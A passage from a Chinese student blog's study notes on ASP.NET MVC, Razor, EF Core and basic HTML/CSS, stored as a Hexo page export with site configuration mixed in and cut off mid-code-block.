title=\"2.MVC三个模块功能\"></a>2.MVC三个模块功能</h4><ul>\n<li>控制器C：处理浏览器的请求，决定如何调用业务层数据的增、删、改、查等业务操作，以及如何将结果返回给视图进行渲染。</li>\n<li>模型M：应用的实体类，用于在内存中暂时存储数据，并在数据变化时通知控制器。</li>\n<li>视图V：主要用来解析、处理、显示内容，并进行模板的渲染。</li>\n</ul>\n<h4 id=\"3-MVC体系结构优点：\"><a href=\"#3-MVC体系结构优点：\" class=\"headerlink\" title=\"3.MVC体系结构优点：\"></a>3.MVC体系结构优点：</h4><p>◼ Controller与View完全分离(松耦合)，有利于前、后台分工合作</p>\n<p>◼ 一个Model可建立多个视图，满足用户不同需求</p>\n<p>◼ Model独立于视图，可移植到新的平台，代码重用高，易于维护</p>\n<p>◼ 表现层的性能可以优化到极致</p>\n<p>◼ 容易对界面逻辑进行单元测试</p>\n<p>◼ 非常强大的URL映射组件，非常干净的URL来建造应用</p>\n<p>◼ 有利于软件工程化管理</p>\n<h4 id=\"4-MVC项目目录结构\"><a href=\"#4-MVC项目目录结构\" class=\"headerlink\" title=\"4.MVC项目目录结构\"></a>4.MVC项目目录结构</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451438.png\"\n                        alt=\"图片-1667485456621\"\n                 ></p>\n<h4 id=\"5-Razor基本概念和基本语法规则\"><a href=\"#5-Razor基本概念和基本语法规则\" class=\"headerlink\" title=\"5.Razor基本概念和基本语法规则\"></a>5.Razor基本概念和基本语法规则</h4><p><code>Razor概念</code>Razor是一个视图模板引擎，它提供了优雅的方法将基于服务器的代码（如C#）嵌入到HTML页面中</p>\n<p><code>Razor语法规则</code></p>\n<p>◼ C# 代码封装于 @{ … } 中</p>\n<p>◼ 代码语句以分号结尾</p>\n<p>◼ 行内表达式（变量和函数）以 @ 开头</p>\n<p>◼ C# 代码对大小写敏感</p>\n<h4 id=\"6-ViewData传值特点\"><a href=\"#6-ViewData传值特点\" class=\"headerlink\" title=\"6.ViewData传值特点\"></a>6.ViewData传值特点</h4><ul>\n<li>ViewData是一个字典对象，用来从Controller向对应的View视图传值</li>\n<li>ViewData只在当前请求中有效，生命周期和View相同，其值不能在多个请求中共享</li>\n<li>在重定向(新请求)后，ViewData存储的值将变为null</li>\n<li>使用ViewData值时必须进行合适的类型转换和建议空值检查</li>\n</ul>\n<h4 id=\"7-TrmpData传值特点\"><a href=\"#7-TrmpData传值特点\" class=\"headerlink\" title=\"7.TrmpData传值特点\"></a>7.TrmpData传值特点</h4><ul>\n<li>TempData也是一个字典对象，但是基于Session存储机制</li>\n<li>TempData用在多个Action间或页面重定向(Redirection)时传递共享数据</li>\n<li>但TempData存放的数据只一次访问中有效，一次访问完成后就会删除</li>\n<li>TempData用法和ViewData相同</li>\n</ul>\n<h4 id=\"8-“新搭建基架的项目”时生成的一些内容：\"><a href=\"#8-“新搭建基架的项目”时生成的一些内容：\" class=\"headerlink\" title=\"8.“新搭建基架的项目”时生成的一些内容：\"></a>8.“新搭建基架的项目”时生成的一些内容：</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451623.png\"\n                        alt=\"图片-1667485469907\"\n                 ></p>\n<h4 id=\"9-EF-Core数据库迁移两个命令：\"><a href=\"#9-EF-Core数据库迁移两个命令：\" class=\"headerlink\" title=\"9.EF Core数据库迁移两个命令：\"></a>9.EF Core数据库迁移两个命令：</h4><p>① <strong><u>Add-Migration InitialCreate</u></strong></p>\n<p>② <strong><u>Uppate-Database</u></strong></p>\n<h4 id=\"10-ORM的概念\"><a href=\"#10-ORM的概念\" class=\"headerlink\" title=\"10.ORM的概念\"></a>10.ORM的概念</h4><blockquote>\n<p>ORM (Object Relation Mapping) 是对象&#x2F;关系映射，它将内存中的对象和数据库中的立映射关系</p>\n</blockquote>\n<h4 id=\"11-ORM技术产生的背景原因\"><a href=\"#11-ORM技术产生的背景原因\" class=\"headerlink\" title=\"11.ORM技术产生的背景原因\"></a>11.ORM技术产生的背景原因</h4><p>◼ 面向对象开发方法是当今企业级应用主流开发方法。</p>\n<p>◼ 关系数据库是企业级应用永久存放数据的主流数据存储系统。</p>\n<p>◼ 对象和关系数据是业务实体两种表现形式：业务实体在内存中表现为对象(非持久化存储)，在数据库中表</p>\n<p>现为关系数据(持久化存储) 。</p>\n<p>◼ 需要一种技术实现二者间映射，以简化编程，提高系统效率 </p>\n<h4 id=\"12-模型的一些DateType注解\"><a href=\"#12-模型的一些DateType注解\" class=\"headerlink\" title=\"12.模型的一些DateType注解\"></a>12.模型的一些DateType注解</h4><table>\n<thead>\n<tr>\n<th align=\"center\">DataType类型值</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DataType.Currency</td>\n<td align=\"center\">表示货币值</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Date</td>\n<td align=\"center\">表示日期值</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.EmailAddress</td>\n<td align=\"center\">表示电子邮件地址</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Multiline Text</td>\n<td align=\"center\">表示多行文本</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Password</td>\n<td align=\"center\">表示密码值</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Time</td>\n<td align=\"center\">表示时间值</td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Url</td>\n<td align=\"center\">表示一个URL值</td>\n</tr>\n</tbody></table>\n<h4 id=\"13-模型的一些验证注解\"><a href=\"#13-模型的一些验证注解\" class=\"headerlink\" title=\"13.模型的一些验证注解\"></a>13.模型的一些验证注解</h4><p>◼ <code>[Required]</code>：验证字段是否不为 null</p>\n<p>◼ <code>[StringLength]</code>：验证字符串属性值是否不超过指定的长度限制。</p>\n<p>◼ <code>[Range]</code>：验证属性值是否位于指定范围内。</p>\n<p>◼ <code>[Compare]</code>：验证模型中的两个属性是否匹配。</p>\n<p>◼ <code>[RegularExpression]</code>：验证 属性值是否与指定的正则表达式匹配。</p>\n<p>◼ <code>[EmailAddress]</code>：验证属性是否具有电子邮件格式。</p>\n<p>注：<code>[DataType]</code>：只是帮助字段进行格式设置，不提供任何验证</p>\n<h4 id=\"14-控制器方法的两个注解\"><a href=\"#14-控制器方法的两个注解\" class=\"headerlink\" title=\"14.控制器方法的两个注解\"></a>14.控制器方法的两个注解</h4><p>◼ <code>[HttpPost] 注解：</code>表明只能由POST请求才能调用此Action方法，不写默认[HttpGet] (第一个Create就是GET)</p>\n<p>◼ <code>[ValidateAntiForgeryToken] 注解：</code>用于防止请求伪造 (更安全)</p>\n<h4 id=\"15-强类型传值\"><a href=\"#15-强类型传值\" class=\"headerlink\" title=\"15.强类型传值\"></a>15.强类型传值</h4><p>◼ 回顾：ViewData字典传值是一个弱类型传值方式 (使用时需要手工强转类型)</p>\n<p>◼ 强类型传值则不需要手工强转类型</p>\n<p>◼ 如何实现强类型传值：</p>\n<pre><code>    ① 控制器在返回视图时，添加模型对象作为参数，即： return View(模型对象); \n\n    ② 在视图中，先使用 @model 指令声明模型对象类型\n\n    ③ 然后在视图中使用Model对象来接收传来的模型对象，之后使用Model对象无需强转\n</code></pre>\n<h4 id=\"16-控制器编程\"><a href=\"#16-控制器编程\" class=\"headerlink\" title=\"16.控制器编程\"></a>16.控制器编程</h4><p>给出数据库表，以及模型类、数据库上下文类，查询所有记录或根据 id 查明细。控制器基本结构：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MoviesController : Controller</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private readonly MvcMovieContext _context;</span><br><span class=\"line\">public MoviesController(MvcMovieContext context)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">_context = context;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// …CRUD操作</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"NET\"><a href=\"#NET\" class=\"headerlink\" title=\"NET\"></a>NET</h1><h1 id=\"一-前端部分\"><a href=\"#一-前端部分\" class=\"headerlink\" title=\"一.前端部分\"></a>一.前端部分</h1><h2 id=\"1-VScode-常用插件\"><a href=\"#1-VScode-常用插件\" class=\"headerlink\" title=\"1.VScode 常用插件\"></a>1.VScode 常用插件</h2><ul>\n<li><code>Live Server</code> <strong>搭建具有实时加载功能的小型服务器</strong></li>\n<li><code>Open-In-Browser</code><strong>直接在浏览器中查看页面</strong></li>\n<li><code>HTML CSS Support</code><strong>HTML和CSS代码提示</strong></li>\n<li><code>CSS Peak</code><strong>追踪至样式表中CSS类和id定义的地方</strong></li>\n<li><code>Prettier-Code formatter</code><strong>代码格式化工具</strong></li>\n<li><code>JavaScript（ES6)CODE SNIPPETS</code><strong>支持ES6和JavaScript代码片段插件</strong></li>\n<li><code>Color Info</code><strong>CSS中使用颜色的相关信息</strong></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"2-HTML\"><a href=\"#2-HTML\" class=\"headerlink\" title=\"2.HTML\"></a>2.HTML</h2><h4 id=\"◼html部分特殊符号\"><a href=\"#◼html部分特殊符号\" class=\"headerlink\" title=\"◼html部分特殊符号\"></a>◼html部分特殊符号</h4><table>\n<thead>\n<tr>\n<th align=\"center\">显示结果</th>\n<th align=\"center\">&amp;nbsp</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">空格</td>\n<td align=\"center\">&amp;nbsp</td>\n</tr>\n<tr>\n<td align=\"center\">&lt;</td>\n<td align=\"center\">&amp;lt</td>\n</tr>\n<tr>\n<td align=\"center\">&gt;</td>\n<td align=\"center\">&amp;gt</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;</td>\n<td align=\"center\">&amp;amp</td>\n</tr>\n<tr>\n<td align=\"center\">£</td>\n<td align=\"center\">&amp;pound</td>\n</tr>\n<tr>\n<td align=\"center\">¥</td>\n<td align=\"center\">&amp;yen</td>\n</tr>\n<tr>\n<td align=\"center\">©</td>\n<td align=\"center\">&amp;copy</td>\n</tr>\n<tr>\n<td align=\"center\">®</td>\n<td align=\"center\">&amp;reg</td>\n</tr>\n<tr>\n<td align=\"center\">™</td>\n<td align=\"center\">&amp;trade</td>\n</tr>\n<tr>\n<td align=\"center\">×</td>\n<td align=\"center\">&amp;times</td>\n</tr>\n</tbody></table>\n<h4 id=\"◼html表格基本结构\"><a href=\"#◼html表格基本结构\" class=\"headerlink\" title=\"◼html表格基本结构\"></a>◼html表格基本结构</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">border</span>=<span class=\"string\">&quot;1&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;600px&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">caption</span>&gt;</span>学生名单<span class=\"tag\">&lt;/<span class=\"name\">caption</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>学号<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>姓名<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>院系<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span> <span class=\"attr\">colspan</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span>操作<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>2021001<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>小明<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>计算机学院<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>编辑<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>删除<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>每个<code>tr</code>表示一行每个<code>th</code>代表这一行中的每个元素值（第一行）<code>td</code>代表这一行中的每个元素值(非第一行)</li>\n<li><code>colspan=3</code>表示这个一次包含3纵列</li>\n<li><code>rowspan=4</code>表示这个一次包含4行</li>\n</ul>\n<h4 id=\"◼form表单基本结构\"><a href=\"#◼form表单基本结构\" class=\"headerlink\" title=\"◼form表单基本结构\"></a>◼form表单基本结构</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;data.html&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;get&quot;</span>&gt;</span></span><br><span class=\"line\">        用户名：<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;nusername&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &lt;<span class=\"attr\">br</span>&gt;</span></span><br><span class=\"line\">        密码：<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pwd&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;提交&quot;</span>&lt;<span class=\"attr\">br</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;reset&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;重填&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"attr\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>http://127.0.0.1:5500/data.html?nusername=123&amp;pwd=456</code>这里将值传入了data.html，值与值之间用**<u>&amp;</u>**隔开</li>\n<li><code>action=xxxx.xxxx</code>表示将这分表单的数据传入<strong>xxxx.xxxx</strong></li>\n<li><code>methon=&#39;get&#39;</code>表示传入方法是<code>get</code>方法，同理还有<code>post</code>方法</li>\n</ul>\n<h4 id=\"◼一些form表单元素及其属性作用\"><a href=\"#◼一些form表单元素及其属性作用\" class=\"headerlink\" title=\"◼一些form表单元素及其属性作用\"></a>◼一些form表单元素及其属性作用</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">        用户名：</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;liulei&quot;</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot;提示信息&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &lt;<span class=\"attr\">br</span>/&gt;</span></span><br><span class=\"line\">        密码：</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pwd&quot;</span> <span class=\"attr\">maxlength</span>=<span class=\"string\">&quot;8&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;长度8个字符&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"attr\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>name=&quot;username&quot;</code>表示将数据提交时url显示的参数名字是<strong>username</strong></li>\n<li><code>value=liulei</code> 属性的值表示的是<code>输入框中显示的初始值</code></li>\n<li><code>title=提示信息</code>鼠标移上去后会弹出“**<u>提示信息</u>**”</li>\n<li><code>maxlength=8</code>最大位数是8</li>\n<li><code>placeholder=&quot;长度8个字符&quot;</code>当没有输入时显示“**<u>长度8个字符</u>**”</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    专业特长：<span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;master&quot;</span> <span class=\"attr\">size</span>=<span class=\"string\">&quot;4&quot;</span> <span class=\"attr\">multiple</span>=<span class=\"string\">&quot;multiple&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span>.NET<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span>&gt;</span>J2EE<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span>Java<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;3&quot;</span>&gt;</span>Android<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;4&quot;</span>&gt;</span>C<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>size</code> 属性规定下拉列表中可见选项的数目</li>\n<li><code>multiple=&quot;multiple&quot;</code>表示可以同时选择多个选项</li>\n<li><code>value</code>属性如果我们选择的是<strong>JAVA</strong>那么我传入的数据就是<strong>master&#x3D;2</strong></li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> &gt;</span></span><br><span class=\"line\">附件：<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;myfile&quot;</span> <span class=\"attr\">accept</span>=<span class=\"string\">&quot;文件类型&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450148.png\"\n                        alt=\"图片\"\n                 ></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;date&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;mydate&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450996.png\"\n                       \n                 ></p>\n<h2 id=\"3-css\"><a href=\"#3-css\" class=\"headerlink\" title=\"3.css\"></a>3.css</h2><h4 id=\"◼-CSS的一些单位\"><a href=\"#◼-CSS的一些单位\" class=\"headerlink\" title=\"◼ CSS的一些单位\"></a>◼ CSS的一些单位</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451939.png\"\n                        alt=\"图片-1667485429884\"\n                 ></p>\n<h4 id=\"◼常见选择器及优先级\"><a href=\"#◼常见选择器及优先级\" class=\"headerlink\" title=\"◼常见选择器及优先级\"></a>◼常见选择器及优先级</h4><table>\n<thead>\n<tr>\n<th>选择器</th>\n<th>10000</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>style（内联样式）</td>\n<td>1000</td>\n</tr>\n<tr>\n<td>id选择器</td>\n<td>100</td>\n</tr>\n<tr>\n<td>类选择器、属性选择器、伪类</td>\n<td>10</td>\n</tr>\n<tr>\n<td>标签选择题、伪元素</td>\n<td>1</td>\n</tr>\n<tr>\n<td>通配符</td>\n<td>0</td>\n</tr>\n</tbody></table>\n<p><strong>一般来说：选择范围较大的级别较低</strong></p>\n<h4 id=\"◼CSS-的-2-个示例\"><a href=\"#◼CSS-的-2-个示例\" class=\"headerlink\" title=\"◼CSS 的 2 个示例\"></a>◼CSS 的 2 个示例</h4><h5 id=\"1-悬浮变色、边框、阴影等效果\"><a href=\"#1-悬浮变色、边框、阴影等效果\" class=\"headerlink\" title=\"1.悬浮变色、边框、阴影等效果\"></a>1.悬浮变色、边框、阴影等效果</h5><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>:lightgrey;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>:<span class=\"number\">130px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-left</span>:<span class=\"number\">20px</span> solid green <span class=\"comment\">/*做边框*/</span></span><br><span class=\"line\">\tborder-radius:<span class=\"number\">5px</span>;<span class=\"comment\">/*圆角*/</span></span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">10px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>:<span class=\"number\">30px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span><span class=\"selector-pseudo\">:hover</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>:<span class=\"built_in\">rgb</span>(<span class=\"number\">151</span>,<span class=\"number\">248</span>,<span class=\"number\">39</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">cursor</span>:pointer;</span><br><span class=\"line\">\t<span class=\"attribute\">box-shadow</span>:<span class=\"number\">3px</span> <span class=\"number\">3px</span> <span class=\"number\">5px</span> <span class=\"number\">1px</span> <span class=\"built_in\">rgba</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0.2</span>);<span class=\"comment\">/*阴影*/</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;<span class=\"selector-tag\">div</span>&gt;武汉科技大学&lt;/<span class=\"selector-tag\">div</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>background-color</code>属性设置元素的背景颜色</li>\n<li><code>width</code>设置段落宽度</li>\n<li><code>border-left</code>设置左边框属性</li>\n<li><code>border-radius</code>添加圆角边框</li>\n<li><code>padding</code>内边距</li>\n<li><code>margin</code>外边距</li>\n<li><code>hover</code>选择鼠标指针浮动在其上的元素，并设置其样式</li>\n<li><code>cursor:pointer</code>网页浏览时用户鼠标指针的样式或图形形状为一只伸出食指的手</li>\n<li><code>box-shadow</code> 属性用于在元素的框架上添加阴影效果（ X 轴偏移量、Y 轴偏移量、模糊半径、扩散半径和颜色）</li>\n</ul>\n<h5 id=\"2-简单导航\"><a href=\"#2-简单导航\" class=\"headerlink\" title=\"2.简单导航\"></a>2.简单导航</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;nav&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span 